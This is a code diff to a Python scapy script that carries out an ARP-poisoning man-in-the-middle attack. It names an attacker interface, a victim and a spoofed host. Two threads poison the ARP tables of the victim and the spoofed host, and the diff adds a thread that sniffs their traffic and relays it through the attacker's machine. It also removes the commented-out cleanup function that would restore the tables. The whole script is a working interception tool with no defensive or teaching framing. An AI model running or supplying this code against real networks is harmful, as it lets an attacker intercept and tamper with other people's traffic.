@@ -3,7 +3,6 @@
 from threading import Thread
 from scapy.all import Ether, ARP, getmacbyip, conf, get_if_addr, get_if_hwaddr, sendp, sniff
 import sys
-import os
 
 
 def poison(iface, iface_mac, target_ip, target_mac, source_ip):
@@ -16,19 +15,7 @@ def poison(iface, iface_mac, target_ip, target_mac, source_ip):
     sendp(packet, iface=iface, inter=1, loop=1)
 
 
-# def heal(iface, iface_mac, target_ip, target_mac, source_ip, source_mac):
-#     packet = Ether() / ARP()
-#     packet[Ether].src = iface_mac
-#     packet[ARP].hwsrc = source_mac
-#     packet[ARP].psrc = source_ip
-#     packet[ARP].hwdst = target_mac
-#     packet[ARP].pdst = target_ip
-#     sendp(packet, iface=iface)
-
-
 if __name__ == "__main__":
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-
     if len(sys.argv) != 3:
         print("Incorrect number of arguments!")
         exit(1)
@@ -49,5 +36,19 @@ if __name__ == "__main__":
     def poison_spoof():
         poison(attacker_iface, attacker_mac, spoof_ip, spoof_mac, victim_ip)
 
-    t1 = Thread(target=poison_victim).start()
-    t2 = Thread(target=poison_spoof).start()
+    def forward_packets():
+        def forward(pkt):
+            if pkt[Ether].src == victim_mac:
+                pkt[Ether].dst = spoof_mac
+            else:
+                pkt[Ether].dst = victim_mac
+            sendp(pkt)
+        sniff(
+            prn=forward,
+            filter="ip and (ether src %s or ether src %s)" % (
+                victim_mac, spoof_mac)
+        )
+
+    Thread(target=poison_victim).start()
+    Thread(target=poison_spoof).start()
+    Thread(target=forward_packets).start()
